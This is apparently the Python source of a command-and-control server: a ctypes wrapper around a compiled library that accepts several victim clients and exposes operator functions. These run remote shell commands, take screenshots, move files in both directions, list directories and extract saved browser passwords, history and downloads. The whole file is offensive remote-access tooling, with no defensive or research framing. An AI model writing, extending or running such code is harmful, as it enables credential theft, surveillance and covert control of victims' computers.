import ctypes
from ctypes import c_void_p, c_char_p, c_int, POINTER, Structure
import os
from typing import Optional

class C2Wrapper:
    """Wrapper class for C2 server operations"""
    
    def __init__(self, lib_path: str = "./bin/lib.so"):

        if not os.path.exists(lib_path):
            raise FileNotFoundError(f"Library not found: {os.path.abspath(lib_path)}")
        
        # Load the shared library
        self.lib = ctypes.CDLL(lib_path)
        
        # Define return types and argument types for each function
        self._setup_function_signatures()
        
        # Socket file descriptor
        self.client_fd: Optional[int] = None
    
    def _setup_function_signatures(self):
        """Configure ctypes function signatures"""
        
        # void free_wrapper(void* ptr)
        self.lib.free_wrapper.argtypes = [c_void_p]
        self.lib.free_wrapper.restype = None
        
        # sock_t sock_setup()
        self.lib.sock_setup.argtypes = []
        self.lib.sock_setup.restype = c_int
        
        # void cleanup(sock_t client_fd)
        self.lib.cleanup.argtypes = [c_int]
        self.lib.cleanup.restype = None
        
        # char* client_info(sock_t client_fd)
        self.lib.client_info.argtypes = [c_int]
        self.lib.client_info.restype = c_void_p
        
        # void psh_handle(sock_t client_fd)
        # char* psh_handle(sock_t client_fd, char* cmd)
        # Returns an allocated C string containing the command output (caller must free)
        self.lib.psh_handle.argtypes = [c_int, c_char_p]
        self.lib.psh_handle.restype = c_void_p
        
        # void screenshot_handle(sock_t client_fd)
        self.lib.screenshot_handle.argtypes = [c_int]
        self.lib.screenshot_handle.restype = None
        
        # void download_file_from_client(sock_t, char*, char*)
        self.lib.download_file_from_client.argtypes = [c_int, c_char_p, c_char_p]
        self.lib.download_file_from_client.restype = None
        
        # void upload_file_to_client(sock_t, char*, char*)
        self.lib.upload_file_to_client.argtypes = [c_int, c_char_p, c_char_p]
        self.lib.upload_file_to_client.restype = None

        # char* browser_password_handle(sock_t client_fd)
        self.lib.browser_password_handle.argtypes = [c_int]
        self.lib.browser_password_handle.restype = c_void_p

        # char* browser_history_handle(sock_t client_fd)
        self.lib.browser_history_handle.argtypes = [c_int]
        self.lib.browser_history_handle.restype = c_void_p

        # char* browser_downloads_handle(sock_t client_fd)
        self.lib.browser_downloads_handle.argtypes = [c_int]
        self.lib.browser_downloads_handle.restype = c_void_p

        # char* browse_dir_handle(sock_t client_fd, char* dir)
        self.lib.browse_dir_handle.argtypes = [c_int, c_char_p]
        self.lib.browse_dir_handle.restype = c_void_p

        # Multi-client APIs
        # int start_listen()
        self.lib.start_listen.argtypes = []
        self.lib.start_listen.restype = c_int

        # int accept_client()
        self.lib.accept_client.argtypes = []
        self.lib.accept_client.restype = c_int

        # char* get_peer_ip(int fd)
        self.lib.get_peer_ip.argtypes = [c_int]
        self.lib.get_peer_ip.restype = c_void_p

        # void stop_listen_and_cleanup()
        self.lib.stop_listen_and_cleanup.argtypes = []
        self.lib.stop_listen_and_cleanup.restype = None
        # int client_is_alive(int fd)
        self.lib.client_is_alive.argtypes = [c_int]
        self.lib.client_is_alive.restype = c_int
    
    def _free_cstring(self, ptr: int):
        """Free memory allocated by C code"""
        if ptr:
            self.lib.free_wrapper(ptr)
    
    def setup(self) -> int:
        """
        Set up the C2 server socket and wait for client connection
        
        Returns:
            Client socket file descriptor
        """
        # Start listening in background (non-blocking) for multiple clients
        res = self.lib.start_listen()
        if res != 0:
            raise RuntimeError("Failed to start listening socket")
        return 0

    def stop_listen(self):
        """Stop listening and cleanup all clients"""
        self.lib.stop_listen_and_cleanup()

    def accept_client(self) -> int:
        """Block until a client connects and return its fd, or -1 on error."""
        fd = self.lib.accept_client()
        return int(fd)

    def get_peer_ip(self, client_fd: int) -> str:
        """Return peer IP for a client fd (caller should not free; wrapper frees the C pointer)."""
        ptr = self.lib.get_peer_ip(int(client_fd))
        if not ptr:
            return ""
        s = ctypes.string_at(ptr).decode('utf-8', errors='replace')
        self._free_cstring(ptr)
        return s

    def client_is_alive(self, client_fd: int) -> bool:
        try:
            r = int(self.lib.client_is_alive(int(client_fd)))
            return r == 1
        except Exception:
            return False
    
    def cleanup(self):
        """Clean up and close the connection"""
        if self.client_fd is not None:
            self.lib.cleanup(self.client_fd)
            self.client_fd = None

    def close_client(self, fd: int):
        """Close a client socket by fd"""
        try:
            self.lib.cleanup(int(fd))
        except Exception:
            pass
    
    def get_client_info(self) -> str:
        """
        Get client information
        
        Returns:
            Client info string
        """
        
        ptr = self.lib.client_info(self.client_fd)
        if not ptr:
            return ""
        
        # Convert C string to Python string
        result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
        self._free_cstring(ptr)
        return result
    
    def get_browser_password(self) -> str:
        """
        Get client browser password
        
        Returns:
            Browser password string
        """
        if self.client_fd is None:
            raise RuntimeError("Client not connected. Call setup() first.")
        
        ptr = self.lib.browser_password_handle(self.client_fd)
        if not ptr:
            return ""
        
        # Convert C string to Python string
        result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
        self._free_cstring(ptr)
        return result
    
    def get_browser_history(self) -> str:
        """
        Get client browser history
        
        Returns:
            Browser history string
        """
        if self.client_fd is None:
            raise RuntimeError("Client not connected. Call setup() first.")
        
        ptr = self.lib.browser_history_handle(self.client_fd)
        if not ptr:
            return ""
        
        # Convert C string to Python string
        result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
        self._free_cstring(ptr)
        return result
    
    def get_browser_downloads(self) -> str:
        """
        Get client browser downloads
        
        Returns:
            Browser downloads string
        """
        if self.client_fd is None:
            raise RuntimeError("Client not connected. Call setup() first.")
        
        ptr = self.lib.browser_downloads_handle(self.client_fd)
        if not ptr:
            return ""
        
        # Convert C string to Python string
        result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
        self._free_cstring(ptr)
        return result
    
    def interactive_shell(self):
        """
        Start interactive PowerShell/command shell session
        This function will block until the user types 'quit'
        """
        if self.client_fd is None:
            raise RuntimeError("Client not connected. Call setup() first.")
        raise NotImplementedError("Interactive shell is removed; use psh_command(cmd) instead")

    def psh_command(self, cmd: str) -> str:
        """
        Execute a single shell command on the client and return its output as a string.
        Caller is responsible for handling/displaying the output.
        """
        if self.client_fd is None:
            raise RuntimeError("Client not connected. Call setup() first.")

        if cmd is None:
            return ""

        cmd_bytes = cmd.encode('utf-8')
        ptr = self.lib.psh_handle(self.client_fd, cmd_bytes)
        if not ptr:
            return ""

        result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
        # free allocated memory from C
        self._free_cstring(ptr)
        return result
    
    def take_screenshot(self):
        """
        Capture screenshot from client and save to file
        File will be saved as screenshot_<timestamp>.bmp
        """
        if self.client_fd is None:
            raise RuntimeError("Client not connected. Call setup() first.")
        
        self.lib.screenshot_handle(self.client_fd)
    
    def download_file(self, remote_path: str, local_path: str):
        """
        Download a file from the client
        
        Args:
            remote_path: Path to file on client machine
            local_path: Path to save file locally
        """
        if self.client_fd is None:
            raise RuntimeError("Client not connected. Call setup() first.")
        
        remote_bytes = remote_path.encode('utf-8')
        local_bytes = local_path.encode('utf-8')
        
        self.lib.download_file_from_client(
            self.client_fd,
            remote_bytes,
            local_bytes
        )
    
    def upload_file(self, local_path: str, remote_path: str):
        """
        Upload a file to the client
        
        Args:
            local_path: Path to file on local machine
            remote_path: Path to save file on client machine
        """
        if self.client_fd is None:
            raise RuntimeError("Client not connected. Call setup() first.")
        
        if not os.path.exists(local_path):
            raise FileNotFoundError(f"Local file not found: {local_path}")
        
        local_bytes = local_path.encode('utf-8')
        remote_bytes = remote_path.encode('utf-8')
        
        self.lib.upload_file_to_client(
            self.client_fd,
            remote_bytes,
            local_bytes
        )

    def get_content_from_dir(self, remote_path: str):
        """
        Get directory content from a directory
        
        Args:
            remote_path: Path on client machine
        """
        remote_bytes = remote_path.encode('utf-8')
        ptr = self.lib.browse_dir_handle(
            self.client_fd,
            remote_bytes
        )
        if not ptr:
            return ""
        
        # Convert C string to Python string
        result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
        self._free_cstring(ptr)
        return result